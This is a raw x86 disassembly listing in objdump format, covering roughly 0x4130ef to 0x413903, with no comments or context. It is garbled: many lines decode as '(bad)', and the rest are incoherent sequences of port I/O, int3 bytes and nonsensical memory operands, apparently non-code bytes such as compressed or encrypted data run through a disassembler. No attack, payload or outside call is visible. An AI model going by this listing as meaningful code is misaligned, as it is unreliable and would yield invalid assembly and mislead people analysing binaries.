  4130ef:	xor    ebp,edi
  4130f1:	inc    DWORD PTR [ebx-0x410001]
  4130f7:	shr    BYTE PTR [ebp+0xfdbf61],cl
  4130fd:	add    BYTE PTR [eax],al
  4130ff:	in     al,0x49
  413101:	add    ah,cl
  413103:	add    bh,bh
  413105:	sar    bh,1
  413107:	fnstenv [esi-0x77c03d]
  41310d:	(bad)  
  41310e:	(bad)  
  41310f:	jg     0x413103
  413111:	inc    DWORD PTR [ebx-0x7ce4ff01]
  413117:	mov    esi,0xe1432a46
  41311c:	int3   
  41311d:	inc    DWORD PTR [eax]
  41311f:	ror    DWORD PTR [eax-0x76ff0001],0x91
  413126:	call   DWORD PTR [edi+0x34bbe640]
  41312c:	add    BYTE PTR [ebx-0x9e4a34],al
  413132:	(bad)  
  413133:	(bad)  
  413134:	(bad)  
  413135:	clc    
  413136:	add    BYTE PTR [ebx-0x62],al
  413139:	push   esp
  41313a:	mov    edi,0xcccc8399
  41313f:	out    0x4c,eax
  413141:	add    BYTE PTR [eax],al
  413143:	int3   
  413144:	jmp    DWORD PTR [edx-0x1]
  413147:	shr    BYTE PTR [eax+0x3808b1],0xff
  41314e:	call   esi
  413150:	imul   eax,DWORD PTR [eax],0xf0000000
  413156:	add    BYTE PTR [ecx-0x18aba4fd],ah
  41315c:	add    DWORD PTR [eax],0xffffffff
  41315f:	shl    BYTE PTR [eax-0x1],0x83
  413163:	inc    DWORD PTR [eax]
  413165:	dec    ebx
  413166:	add    BYTE PTR [eax+edx*4+0x5d],al
  41316a:	mov    dl,0x55
  41316c:	inc    DWORD PTR [ebx+0x8afa00]
  413172:	add    DWORD PTR [eax],0xffffff83
  413175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413176:	int3   
  413177:	inc    ebp
  413178:	mov    eax,ds:0xffd8e2e5
  41317d:	inc    DWORD PTR [eax]
  41317f:	iret   
  413180:	sub    edi,edi
  413182:	(bad)  
  413183:	(bad)  
  413184:	inc    esi
  413186:	call   FWORD PTR [ebx-0x4f]
  413189:	ins    DWORD PTR es:[edi],dx
  41318a:	xchg   edi,eax
  41318b:	and    DWORD PTR [eax],eax
  41318d:	add    bh,bh
  41318f:	aaa    
  413190:	jge    0x413192
  413192:	dec    esp
  413194:	call   DWORD PTR [ebx]
  413196:	add    ch,dl
  413198:	cli    
  413199:	mov    ecx,DWORD PTR [eax-0x76007cf8]
  41319f:	sbb    al,0xbb
  4131a1:	(bad)  
  4131a2:	inc    DWORD PTR [ebx-0x5d00a634]
  4131a8:	mov    al,ds:0xff572fbc
  4131ad:	(bad)  
  4131ae:	(bad)  
  4131af:	jmp    0x41317e
  4131b1:	(bad)  
  4131b2:	inc    DWORD PTR [eax]
  4131b4:	int3   
  4131b5:	call   DWORD PTR ss:[eax]
  4131b8:	ja     0x41317d
  4131ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131bb:	ret    
  4131bc:	or     esp,0xffffff83
  4131bf:	cmp    dl,cl
  4131c1:	cmp    edi,0xffffff89
  4131c4:	int3   
  4131c5:	jne    0x41314a
  4131c7:	and    DWORD PTR fs:[ecx],ebp
  4131ca:	and    al,0xd6
  4131cc:	inc    DWORD PTR [eax]
  4131ce:	add    BYTE PTR [eax-0x66],bh
  4131d4:	xor    DWORD PTR [esi-0x7d],0x3e
  4131d8:	addr16 dec ebp
  4131da:	addr16 jbe 0x4131dc
  4131dd:	add    DWORD PTR [eax],0xffffffe1
  4131e0:	push   cs
  4131e1:	mov    edi,edi
  4131e3:	add    BYTE PTR [ebx-0x5d0a00d7],al
  4131e9:	ret    
  4131ea:	loope  0x41321a
  4131ec:	add    BYTE PTR [ebx-0xaf8901],al
  4131f2:	or     esp,0x0
  4131f5:	ja     0x4131f7
  4131f7:	ins    DWORD PTR es:[edi],dx
  4131f8:	pop    es
  4131f9:	push   edi
  4131fa:	in     eax,0x68
  4131fc:	dec    esp
  4131fe:	add    BYTE PTR [edi-0x7c0088],ah
  413204:	int3   
  413205:	fld    DWORD PTR [eax]
  413207:	lahf   
  413208:	mov    ah,0x5e
  41320a:	(bad)  
  41320b:	ds int3 
  41320d:	add    BYTE PTR [eax],al
  41320f:	(bad)  
  413210:	out    0x0,eax
  413212:	inc    DWORD PTR [eax]
  413214:	push   edi
  413216:	call   DWORD PTR [ecx+ebx*8+0xf49c00]
  41321d:	cmp    edi,0xffffffe6
  413220:	dec    esp
  413221:	add    BYTE PTR [ebx-0x7601ff01],al
  413227:	cmp    ecx,DWORD PTR [ebp-0x78697b]
  41322d:	add    bh,bh
  41322f:	or     al,0x10
  413231:	inc    DWORD PTR [eax]
  413233:	(bad)  
  413234:	dec    ebp
  413236:	call   DWORD PTR [esi-0x55]
  413239:	in     eax,0x2e
  41323b:	push   esp
  41323c:	mov    edi,edi
  41323e:	or     esp,0xffffff88
  413241:	mov    esp,ecx
  413243:	cmp    edi,0x32
  413246:	add    BYTE PTR [ecx+0x64502c9e],cl
  41324c:	inc    DWORD PTR [eax]
  41324e:	call   DWORD PTR [esi]
  413250:	lods   eax,DWORD PTR ds:[esi]
  413251:	or     esp,0xffffffff
  413254:	sub    ebp,0xffffffff
  413257:	stos   DWORD PTR es:[edi],eax
  413258:	outs   dx,BYTE PTR ds:[esi]
  413259:	out    dx,eax
  41325a:	in     eax,0xb3
  41325c:	(bad)  
  41325d:	inc    DWORD PTR [eax]
  41325f:	mov    edi,0x83db
  413264:	and    DWORD PTR [edx-0x1da06177],0x7b
  41326b:	addr16 (bad) 
  41326d:	inc    DWORD PTR [eax]
  41326f:	mov    ebp,0x83ff69
  413274:	add    BYTE PTR [edx+0x7c2c4700],ch
  41327a:	scas   al,BYTE PTR es:[edi]
  41327b:	pop    ebp
  41327c:	add    bh,bh
  41327e:	add    bl,cl
  413280:	gs cmp edi,0x0
  413284:	add    BYTE PTR [edi],dh
  413286:	(bad)  
  413287:	cmp    BYTE PTR [eax+0x33],bh
  41328a:	jbe    0x41321c
  41328c:	inc    DWORD PTR [eax]
  41328e:	mov    eax,esi
  413290:	test   ah,cl
  413292:	int3   
  413293:	inc    DWORD PTR [ebx+0x7607ff91]
  413299:	idiv   DWORD PTR [edi]
  41329b:	pushf  
  41329c:	dec    esp
  41329e:	(bad)  
  41329f:	jp     0x413303
  4132a1:	add    bh,bh
  4132a3:	inc    DWORD PTR [eax]
  4132a5:	mov    dl,0xff
  4132a7:	push   ebx
  4132a8:	mov    gs,WORD PTR [eax]
  4132aa:	mov    cl,BYTE PTR [ebx+0x16ffffff]
  4132b0:	mov    al,0xff
  4132b2:	(bad)  
  4132b3:	(bad)  
  4132b4:	dec    esi
  4132b6:	sbb    DWORD PTR [ebx],0xffffffc2
  4132b9:	pusha  
  4132ba:	aaa    
  4132bb:	sbb    bh,bh
  4132bd:	add    BYTE PTR [ebx-0x76002253],al
  4132c3:	add    ah,cl
  4132c5:	or     eax,0xb3beb00
  4132ca:	jae    0x4132a2
  4132cc:	(bad)  
  4132cd:	(bad)  
  4132ce:	inc    DWORD PTR [edx-0x16]
  4132d4:	add    ah,ah
  4132d6:	call   edi
  4132d8:	neg    BYTE PTR [esi+eiz*1-0x76ffff5b]
  4132df:	rol    BYTE PTR ds:0x0,cl
  4132e5:	pop    ebx
  4132e6:	jmp    DWORD PTR [edi-0x13]
  4132e9:	pop    edi
  4132ea:	fisubr WORD PTR [esi+0x1800ffff]
  4132f0:	xor    edi,edi
  4132f2:	(bad)  
  4132f3:	(bad)  
  4132f4:	inc    ebp
  4132f6:	add    BYTE PTR [ebx-0x5a],bh
  4132f9:	fdiv   DWORD PTR [edx]
  4132fb:	nop
  4132fc:	add    BYTE PTR [eax],al
  4132fe:	int3   
  4132ff:	xchg   esp,eax
  413300:	xchg   edi,eax
  413301:	inc    DWORD PTR [eax]
  413303:	inc    DWORD PTR [eax]
  413305:	call   0x86799593
  41330a:	and    DWORD PTR [ebx-0x40ffff77],ebx
  413310:	(bad)  
  413311:	add    BYTE PTR [eax],al
  413313:	dec    esp
  413315:	ret    
  413316:	add    BYTE PTR [esi],ch
  413318:	and    BYTE PTR ds:0xff85da,bl
  41331e:	add    dh,ch
  413320:	cwde   
  413321:	add    bh,bh
  413323:	add    BYTE PTR [eax],al
  413325:	retf   
  413326:	push   DWORD PTR [ebp+0x47344ca2]
  41332c:	(bad)  
  41332d:	inc    DWORD PTR [eax]
  41332f:	(bad)  
  413330:	mov    ebp,0xff00ccff
  413335:	bound  eax,QWORD PTR [ebx-0x1fb4c9a9]
  41333b:	cmp    bh,bh
  41333d:	cmp    edi,0xffffffa9
  413340:	xchg   BYTE PTR [eax],al
  413342:	(bad)  
  413343:	inc    DWORD PTR [eax]
  413345:	push   edx
  413346:	sub    edi,0x17
  413349:	dec    edi
  41334a:	cli    
  41334b:	xchg   edi,edi
  41334d:	or     esp,0xffffffa0
  413350:	test   BYTE PTR [eax],0xcc
  413353:	inc    DWORD PTR [ebx+0x45a7ffc6]
  413359:	test   ebx,0x83ff896e
  41335f:	adc    ch,dh
  413361:	(bad)  
  413362:	inc    DWORD PTR [eax]
  413364:	jmp    DWORD PTR [eax-0x4ac54e00]
  41336a:	movups xmm0,XMMWORD PTR [eax]
  41336d:	int3   
  41336e:	mov    DWORD PTR ds:0xff83b2,esp
  413374:	mov    DWORD PTR [ecx+0x6ef428ff],edi
  41337a:	pop    es
  41337b:	cwde   
  41337c:	add    DWORD PTR [eax],0x0
  41337f:	pop    eax
  413380:	or     edi,edi
  413382:	inc    DWORD PTR [eax]
  413384:	jmp    FWORD PTR [edi+edi*8+0x73]
  413388:	adc    eax,0x84b6c5
  41338d:	inc    DWORD PTR [eax]
  41338f:	aad    0xc4
  413391:	inc    DWORD PTR [eax]
  413393:	(bad)  
  413394:	inc    DWORD PTR [ecx+0x0]
  413397:	pop    edx
  413398:	pop    ebx
  413399:	adc    DWORD PTR [eax],esp
  41339b:	mov    bl,0xff
  41339d:	add    bh,bh
  41339f:	add    al,cl
  4133a1:	(bad)  
  4133a2:	inc    DWORD PTR [ebx+0x7d8332cc]
  4133a8:	test   cl,cl
  4133aa:	push   ebx
  4133ab:	push   esi
  4133ac:	dec    esp
  4133ae:	sub    DWORD PTR [eax],0xffffffcd
  4133b1:	(bad)  
  4133b2:	(bad)  
  4133b3:	inc    DWORD PTR [eax]
  4133b5:	lods   eax,DWORD PTR ds:[esi]
  4133b6:	add    BYTE PTR [ebx+edx*8],al
  4133b9:	jmp    0x413439
  4133bb:	lods   eax,DWORD PTR ds:[esi]
  4133bc:	int3   
  4133bd:	inc    DWORD PTR [eax]
  4133bf:	pop    ebx
  4133c0:	fdivp  st(7),st
  4133c2:	mov    edi,edi
  4133c4:	mov    DWORD PTR [edx],edx
  4133c6:	add    BYTE PTR [ebp+0x560c2610],ch
  4133cc:	inc    DWORD PTR [eax]
  4133ce:	dec    DWORD PTR [ecx]
  4133d0:	pop    edx
  4133d1:	add    ah,cl
  4133d3:	mov    DWORD PTR [eax],eax
  4133d5:	fxch   st(4)
  4133d7:	fwait
  4133d8:	lock sti 
  4133da:	and    eax,0x8383ff96
  4133df:	ja     0x41336a
  4133e1:	cmp    edi,0xffffffcc
  4133e4:	inc    DWORD PTR [eax-0x46df1800]
  4133ea:	sbb    eax,0x8300ffe7
  4133ef:	cdq    
  4133f0:	pop    ebp
  4133f1:	(bad)  
  4133f2:	(bad)  
  4133f3:	(bad)  
  4133f4:	inc    DWORD PTR [eax-0x56968201]
  4133fa:	mov    dl,0xaf
  4133fc:	add    BYTE PTR [eax],al
  4133fe:	add    BYTE PTR [ecx-0x6],al
  413401:	int3   
  413402:	int3   
  413403:	int3   
  413404:	call   DWORD PTR [ecx-0x5202cf01]
  41340a:	or     eax,0xffffcc7d
  41340f:	adc    eax,0x83ff00a8
  413414:	add    BYTE PTR [esi-0x1],ah
  413417:	xor    dl,BYTE PTR [edx]
  413419:	pop    esi
  41341a:	add    cl,BYTE PTR [esi-0x34]
  41341d:	add    BYTE PTR [eax],al
  41341f:	and    al,0x1d
  413421:	mov    esp,ecx
  413423:	(bad)  
  413424:	dec    DWORD PTR [edi-0xfac5d00]
  41342a:	push   0xccfffffc
  41342f:	shl    DWORD PTR [esi],cl
  413431:	inc    DWORD PTR [eax]
  413433:	mov    DWORD PTR [eax],eax
  413435:	test   al,0x0
  413437:	mov    dh,BYTE PTR ds:0xffe9c11b
  41343d:	inc    DWORD PTR [eax]
  41343f:	push   ds
  413440:	sub    al,0xff
  413442:	add    bh,bh
  413444:	add    BYTE PTR [ecx],cl
  413446:	sbb    DWORD PTR [ebp-0x36],0xfffffff7
  41344a:	inc    eax
  41344b:	test   al,0xff
  41344d:	add    BYTE PTR [eax],al
  41344f:	popf   
  413450:	aas    
  413451:	cmp    edi,0xffffff83
  413454:	(bad)  
  413455:	std    
  413456:	mov    DWORD PTR [edi+ebp*4],edi
  413459:	inc    eax
  41345a:	mov    es,WORD PTR [ebx+0x0]
  41345d:	(bad)  
  41345e:	(bad)  
  41345f:	jmp    FWORD PTR [ebx-0x77]
  413462:	add    bh,bh
  413464:	add    BYTE PTR [edx-0x30b21d01],dh
  41346a:	scas   al,BYTE PTR es:[edi]
  41346b:	and    eax,0x6ff00cc
  413470:	xlat   BYTE PTR ds:[ebx]
  413471:	int3   
  413472:	add    BYTE PTR [eax],al
  413474:	mov    esp,ebp
  413476:	jmp    FWORD PTR [esi+0x65a8fade]
  41347c:	add    BYTE PTR [eax],al
  41347e:	add    al,ch
  413480:	jo     0x413481
  413482:	add    DWORD PTR [eax],0xffffff83
  413485:	lods   al,BYTE PTR ds:[esi]
  413486:	add    BYTE PTR [eax+0x29b23354],al
  41348c:	cmp    edi,0xffffffff
  41348f:	xchg   ebp,eax
  413490:	xchg   DWORD PTR [ebx+0x2b008300],eax
  413496:	dec    eax
  413498:	ss pop eax
  41349a:	(bad)  
  41349c:	int3   
  41349d:	inc    DWORD PTR [eax]
  41349f:	std    
  4134a0:	jmp    0x40be28
  4134a5:	sti    
  4134a6:	sub    ebp,0xffffffdb
  4134a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134aa:	es (bad) 
  4134ac:	(bad)  
  4134ad:	inc    DWORD PTR [ebx+0xf716]
  4134b3:	inc    DWORD PTR [eax]
  4134b5:	push   ebp
  4134b6:	int3   
  4134b7:	out    dx,eax
  4134b8:	mov    edx,DWORD PTR [edx-0x16]
  4134bb:	dec    esi
  4134bc:	add    BYTE PTR [ecx-0x7c148701],cl
  4134c2:	add    DWORD PTR [ebx-0x4000de7d],0xffffff9c
  4134c9:	repnz and esp,DWORD PTR [ebx+0x0]
  4134cd:	add    bh,bh
  4134cf:	leave  
  4134d0:	sbb    edi,edi
  4134d2:	add    BYTE PTR [eax],al
  4134d4:	dec    esp
  4134d6:	mov    DWORD PTR [esi-0x234ede6],ebp
  4134dc:	dec    esp
  4134de:	sub    esp,0x28
  4134e1:	inc    DWORD PTR [ebx-0x7c593400]
  4134e7:	out    0xd5,eax
  4134e9:	in     al,dx
  4134ea:	sbb    al,0x7d
  4134ec:	or     DWORD PTR [ecx-0x3f6277],0xffffff83
  4134f3:	inc    DWORD PTR [eax]
  4134f5:	repz dec DWORD PTR [ebx-0x2945658]
  4134fc:	int3   
  4134fd:	add    BYTE PTR [ecx+0x8397bf],cl
  413503:	dec    esp
  413505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413506:	push   DWORD PTR [ecx-0x399e6d52]
  41350c:	add    BYTE PTR [ecx-0x33851601],cl
  413512:	inc    DWORD PTR [eax]
  413514:	(bad)  
  413515:	jmp    0xbe78161a
  41351a:	sbb    eax,0xccff00a3
  41351f:	js     0x41352b
  413521:	add    DWORD PTR [ebx-0x70100],0x79
  413528:	cmc    
  413529:	mov    ah,0x11
  41352b:	into   
  41352c:	add    DWORD PTR [eax],0xffffffff
  41352f:	mov    edi,0xffccff26
  413534:	dec    esi
  413536:	dec    DWORD PTR [eax-0x6b]
  413539:	ja     0x4134e5
  41353b:	je     0x4134c0
  41353d:	inc    DWORD PTR [eax]
  41353f:	mov    ds:0xff83fff8,eax
  413544:	int3   
  413545:	scas   al,BYTE PTR es:[edi]
  413546:	(bad)  
  413547:	mov    edx,0x6d91e885
  41354c:	add    BYTE PTR [eax],al
  41354e:	add    bl,ch
  413550:	in     eax,0xff
  413552:	(bad)  
  413553:	(bad)  
  413554:	jmp    DWORD PTR [ebx+0x0]
  413557:	(bad)  
  413558:	mov    edx,0x83b50d30
  41355d:	(bad)  
  41355e:	jmp    DWORD PTR [edx-0x20]
  413561:	inc    DWORD PTR [eax]
  413563:	add    bh,bh
  413565:	cwde   
  413566:	adc    DWORD PTR [ebx-0x48],0xffffff9e
  41356a:	repnz cmp eax,0x31ffff83
  413570:	icebp  
  413571:	add    BYTE PTR [eax],al
  413573:	add    bh,bh
  413575:	inc    esi
  413576:	cmp    DWORD PTR [edi-0x6a77d5da],0x0
  41357d:	(bad)  
  41357e:	push   DWORD PTR [edx]
  413580:	mov    ch,0xff
  413582:	int3   
  413583:	mov    DWORD PTR [eax],eax
  413585:	push   0xffffff89
  413587:	sub    edx,0x3c
  41358a:	mov    bh,0x49
  41358c:	int3   
  41358d:	add    BYTE PTR [ecx+0x1774],cl
  413593:	int3   
  413594:	add    BYTE PTR [ecx-0x1],ch
  413597:	push   eax
  413598:	add    dh,BYTE PTR [ecx+0xff4cc9]
  41359e:	add    DWORD PTR ds:0x17,0x0
  4135a5:	xchg   ebx,eax
  4135a6:	add    DWORD PTR ds:0xa75136fe,0xffffff89
  4135ad:	int3   
  4135ae:	add    BYTE PTR [edi],ah
  4135b0:	or     bh,bh
  4135b2:	int3   
  4135b3:	add    BYTE PTR [eax],al
  4135b5:	(bad)  
  4135b6:	(bad)  
  4135b7:	jl     0x413599
  4135b9:	in     al,dx
  4135ba:	out    dx,al
  4135bb:	into   
  4135bc:	dec    DWORD PTR [ecx-0x18f777]
  4135c2:	int3   
  4135c3:	(bad)  
  4135c4:	call   FWORD PTR [ebp+0x385bfff]
  4135ca:	jmp    0x89423528
  4135cf:	retf   
  4135d0:	dec    ebx
  4135d1:	mov    DWORD PTR [eax],eax
  4135d3:	add    bh,bh
  4135d5:	loop   0x4135d6
  4135d7:	dec    edx
  4135d8:	mov    al,ds:0x35af9d
  4135dd:	inc    DWORD PTR [ebx-0x33d2de]
  4135e3:	or     DWORD PTR [ecx-0x47e57ce5],0x19
  4135ea:	js     0x41362c
  4135ec:	inc    DWORD PTR [eax]
  4135ee:	call   FWORD PTR [ebx]
  4135f0:	mov    al,0xff
  4135f2:	or     DWORD PTR [ecx+0x5783b600],0x3
  4135f9:	inc    eax
  4135fa:	add    DWORD PTR [edi-0x1f00007d],0x8383ffa3
  413604:	jmp    FWORD PTR [edi]
  413606:	add    BYTE PTR [ebx-0x383d19c1],ah
  41360c:	add    bh,bh
  41360e:	mov    edi,ebp
  413610:	add    BYTE PTR [ebx+0x6f00ff83],0x83
  413617:	stc    
  413618:	call   0x8a295ce8
  41361d:	add    ah,cl
  41361f:	jnp    0x41368d
  413621:	(bad)  
  413622:	dec    esp
  413624:	add    al,cl
  413626:	add    BYTE PTR [ecx],ah
  413628:	in     al,0xcd
  41362a:	mov    dl,0x67
  41362c:	add    bh,bh
  41362e:	int3   
  41362f:	xchg   esp,eax
  413630:	mov    eax,0xffccccff
  413635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413636:	add    dl,dh
  413638:	pop    esp
  413639:	dec    edx
  41363a:	cmp    ch,ch
  41363c:	inc    DWORD PTR [ebx+0x7928ff]
  413642:	int3   
  413643:	add    BYTE PTR [ebx+0x1e320037],al
  413649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41364a:	pop    esp
  41364b:	sar    edi,1
  41364d:	add    bh,bh
  41364f:	sbb    DWORD PTR [esi],ecx
  413651:	(bad)  
  413652:	inc    DWORD PTR [ebx-0x2f001600]
  413658:	cmp    BYTE PTR [eax-0x7c54ae],ah
  41365e:	add    BYTE PTR [ebx+0x2f],bl
  413661:	add    BYTE PTR [eax],al
  413663:	(bad)  
  413664:	call   DWORD PTR [edi-0x7d]
  413667:	and    eax,0x2d465140
  41366c:	mov    edi,edi
  41366e:	int3   
  41366f:	jo     0x413655
  413671:	int3   
  413672:	add    DWORD PTR [eax],0x0
  413675:	lahf   
  413676:	(bad)  
  413677:	std    
  413678:	push   cs
  413679:	sbb    edx,ebp
  41367b:	retf   
  41367c:	int3   
  41367d:	int3   
  41367e:	add    DWORD PTR [ebx-0x55],0xffffffff
  413682:	add    BYTE PTR [eax],al
  413684:	mov    edi,ebx
  413686:	add    bh,dl
  413688:	xor    al,ch
  41368a:	lahf   
  41368b:	cli    
  41368c:	inc    DWORD PTR [eax]
  41368e:	jmp    DWORD PTR [edi+0x36]
  413691:	(bad)  
  413692:	inc    DWORD PTR [ebx+0x3800c4ff]
  413698:	bound  eax,QWORD PTR [ecx-0x28]
  41369b:	mov    edi,0xbeff00cc
  4136a0:	xor    BYTE PTR [eax],al
  4136a2:	add    bh,bh
  4136a4:	push   ebp
  4136a6:	and    DWORD PTR [edi+0x40],0xfffffff1
  4136aa:	dec    edx
  4136ab:	inc    esp
  4136ac:	mov    edi,edi
  4136ae:	add    BYTE PTR [edx],bh
  4136b0:	in     al,dx
  4136b1:	add    BYTE PTR [ebx+0x31cccc],al
  4136b7:	gs push esi
  4136b9:	mov    ds:0xfffff065,eax
  4136be:	mov    DWORD PTR [eax+0x62],ebp
  4136c1:	mov    edi,edi
  4136c3:	add    ah,cl
  4136c5:	sar    bh,1
  4136c7:	ins    DWORD PTR es:[edi],dx
  4136c8:	loope  0x4136dc
  4136ca:	clc    
  4136cb:	inc    esp
  4136cc:	mov    DWORD PTR [eax],eax
  4136ce:	add    BYTE PTR [ebx-0x43],al
  4136d1:	inc    DWORD PTR [ebx-0x720001]
  4136d7:	rol    DWORD PTR [ebx+ebp*1],cl
  4136da:	shl    BYTE PTR [esp+ecx*8+0x0],cl
  4136de:	jmp    DWORD PTR [eax-0x31]
  4136e4:	(bad)  
  4136e5:	out    dx,eax
  4136e6:	mov    ecx,eax
  4136e8:	and    al,0xe1
  4136ea:	mov    ebx,DWORD PTR [ecx-0x1]
  4136ed:	(bad)  
  4136ee:	call   FWORD PTR [ebx+0x54]
  4136f1:	inc    DWORD PTR [ebx-0x76e67c01]
  4136f7:	fcmove st,st(1)
  4136f9:	jge    0x4136be
  4136fb:	mov    eax,0xf683ffff
  413700:	adc    al,BYTE PTR [eax]
  413702:	inc    DWORD PTR [ebx+0x32ff1c83]
  413708:	push   ss
  413709:	push   cs
  41370a:	into   
  41370b:	aas    
  41370c:	inc    DWORD PTR [eax]
  41370e:	jmp    DWORD PTR [ebx-0xff0077]
  413714:	call   DWORD PTR [ebx+eax*4]
  413717:	pop    eax
  413718:	aaa    
  413719:	mov    esp,0x830676
  41371e:	mov    DWORD PTR [edx+0x15],ebp
  413721:	int3   
  413722:	add    BYTE PTR [eax],al
  413724:	(bad)  
  413725:	fadd   QWORD PTR [eax]
  413727:	inc    esp
  413728:	mov    ebp,DWORD PTR [ecx-0x77]
  41372b:	cwde   
  41372c:	(bad)  
  41372d:	(bad)  
  41372e:	dec    DWORD PTR [esi-0x330000cf]
  413734:	or     ebx,0xffffffff
  413737:	ds pusha 
  413739:	rol    esp,cl
  41373b:	jno    0x4136c0
  41373d:	add    BYTE PTR [ecx-0x7cd38a],cl
  413743:	add    bh,bh
  413745:	pop    ecx
  413746:	add    ch,ch
  413748:	mov    ah,0x41
  41374a:	xlat   BYTE PTR ds:[ebx]
  41374b:	sub    bh,bh
  41374d:	(bad)  
  41374e:	push   DWORD PTR [edi+0x6f]
  413751:	add    ah,cl
  413753:	add    DWORD PTR [eax],0x48
  413756:	add    DWORD PTR [esi+0x1d],0x42
  41375a:	lock add al,BYTE PTR [eax]
  41375d:	add    BYTE PTR [eax],al
  41375f:	outs   dx,BYTE PTR ds:[esi]
  413760:	test   DWORD PTR [ebx+0x54ffcc89],0xce26a500
  41376a:	mov    ds:0x89ccffc5,eax
  41376f:	dec    ecx
  413770:	sbb    eax,0xff0083ff
  413775:	sub    al,0xff
  413777:	mov    ch,0xc8
  413779:	pop    edx
  41377a:	or     al,0xcb
  41377c:	inc    DWORD PTR [eax]
  41377e:	int3   
  41377f:	rol    BYTE PTR [ecx+0x0],0xff
  413783:	add    BYTE PTR [ecx-0x77b9ff39],cl
  413789:	xchg   BYTE PTR [ebp-0x48],dl
  41378c:	add    bh,bh
  41378e:	call   FWORD PTR [edx]
  413790:	mov    edx,0x89ffff89
  413795:	inc    DWORD PTR gs:[eax]
  413798:	icebp  
  413799:	mov    eax,ds:0xff9c25
  41379e:	add    BYTE PTR [edx-0x6],bl
  4137a4:	int3   
  4137a5:	push   ecx
  4137a6:	xor    DWORD PTR [ecx-0x73],0x25
  4137aa:	mov    ebp,0x89ffccc1
  4137af:	xchg   DWORD PTR [esi-0x77],ebx
  4137b2:	add    BYTE PTR [eax],al
  4137b4:	add    BYTE PTR [edx],ch
  4137b6:	inc    DWORD PTR [esi-0x1b]
  4137b9:	cmp    bh,BYTE PTR [edx+0x27]
  4137bc:	add    bh,bh
  4137be:	adc    DWORD PTR [edi+eiz*4-0x1],0x0
  4137c3:	add    bh,bh
  4137c5:	xor    al,0xcc
  4137c7:	lods   eax,DWORD PTR ds:[esi]
  4137c8:	clc    
  4137c9:	xor    BYTE PTR [edi-0x64],al
  4137cc:	mov    DWORD PTR [ecx+0x725eff],ecx
  4137d2:	add    DWORD PTR [eax],0xffffffff
  4137d5:	jno    0x4137d6
  4137d7:	xchg   DWORD PTR [edx-0x10],edi
  4137da:	pop    esp
  4137db:	imul   edi,edi,0x4d1783ff
  4137e1:	mov    edi,edi
  4137e3:	add    BYTE PTR [ebx-0x1df37cd8],al
  4137e9:	inc    ebx
  4137ea:	lahf   
  4137eb:	pop    DWORD PTR [eax]
  4137ed:	add    BYTE PTR [ebx+0x8a5e],al
  4137f3:	add    BYTE PTR [eax],al
  4137f5:	ror    ah,0x50
  4137f8:	jl     0x41382f
  4137fa:	gs retf 0xff89
  4137fe:	dec    esp
  413800:	inc    esp
  413801:	mov    DWORD PTR [eax],eax
  413803:	cmp    edi,0xffffffd4
  413806:	mov    DWORD PTR [esi-0xc],ecx
  413809:	mov    ecx,0xff81be
  41380e:	add    BYTE PTR [eax],ch
  413810:	jnp    0x41379b
  413812:	add    BYTE PTR [ebx-0x43001301],al
  413818:	and    al,0x28
  41381a:	lods   al,BYTE PTR ds:[esi]
  41381b:	xor    al,0x0
  41381d:	add    bh,bh
  41381f:	fcomp  DWORD PTR [eax+eax*1-0x227cff01]
  413826:	dec    DWORD PTR [eax+0x40]
  413829:	jl     0x413814
  41382b:	mov    edx,0xff00ff89
  413830:	xor    edi,edi
  413832:	inc    DWORD PTR [eax]
  413834:	xor    DWORD PTR [edi-0x17c42d00],0x1d
  41383b:	(bad)  
  41383c:	inc    DWORD PTR [eax]
  41383e:	add    BYTE PTR [ebp-0x16],al
  413844:	add    ah,bl
  413846:	add    BYTE PTR [ecx+eiz*8+0x11],al
  41384a:	mov    eax,0xff00831c
  41384f:	cld    
  413850:	xor    eax,0x89ccff83
  413855:	pushf  
  413856:	add    BYTE PTR [ebx+0x32499b31],dh
  41385c:	(bad)  
  41385d:	inc    DWORD PTR [eax]
  41385f:	sbb    DWORD PTR [ebp-0x7d],esi
  413862:	int3   
  413863:	inc    DWORD PTR [eax]
  413865:	scas   eax,DWORD PTR es:[edi]
  413866:	jmp    FWORD PTR [eax-0x54ac05ce]
  41386c:	add    DWORD PTR [eax],0xffffffff
  41386f:	aam    0xbd
  413871:	or     DWORD PTR [ecx-0x7c597700],0xffffff83
  413878:	aas    
  413879:	cwde   
  41387a:	jge    0x413820
  41387c:	(bad)  
  41387d:	inc    DWORD PTR [eax]
  41387f:	sub    al,0xc4
  413881:	dec    DWORD PTR [ecx+0x87ff83]
  413887:	or     eax,0x116267d0
  41388c:	int3   
  41388d:	add    DWORD PTR [eax],0x54
  413890:	cld    
  413891:	mov    edi,edi
  413893:	inc    DWORD PTR [ebx-0x17320075]
  413899:	lods   al,BYTE PTR ds:[esi]
  41389a:	push   esp
  41389b:	repnz add BYTE PTR [ebx-0x33a3c501],al
  4138a2:	add    bh,bh
  4138a4:	add    BYTE PTR [edi+edi*8+0x5f],bl
  4138a8:	ins    BYTE PTR es:[edi],dx
  4138a9:	mov    bl,cl
  4138ab:	call   0xccf8:0x7cc89ff
  4138b2:	or     DWORD PTR [ecx-0xa00ef00],0x17
  4138b9:	adc    DWORD PTR [eax+0x8983b6],ebx
  4138bf:	sbb    dl,BYTE PTR [edi+edi*8]
  4138c2:	add    BYTE PTR [eax],al
  4138c4:	add    DWORD PTR [eax-0x22e03577],0x4b
  4138cb:	add    bh,bh
  4138cd:	add    BYTE PTR [eax],al
  4138cf:	push   esi
  4138d0:	fadd   DWORD PTR [eax]
  4138d2:	inc    DWORD PTR [ebx+0x75cc91ff]
  4138d8:	test   DWORD PTR [edi],edx
  4138da:	pop    ebp
  4138db:	lds    eax,FWORD PTR [ebx+0x2961ffff]
  4138e1:	add    BYTE PTR [eax],al
  4138e3:	cmp    edi,0x2
  4138e6:	jmp    FWORD PTR [ecx+0x15cff9f2]
  4138ec:	add    bh,bh
  4138ee:	int3   
  4138ef:	mov    bl,0x52
  4138f1:	add    bh,bh
  4138f3:	mov    edi,edi
  4138f5:	in     al,0xff
  4138f7:	dec    ebx
  4138f8:	lds    ebx,FWORD PTR [esi+0x62]
  4138fb:	jnp    0x413886
  4138fd:	add    BYTE PTR [ebx-0x76b3c5],al
  413903:	dec    DWORD PTR [ecx+0x4e32ff42]
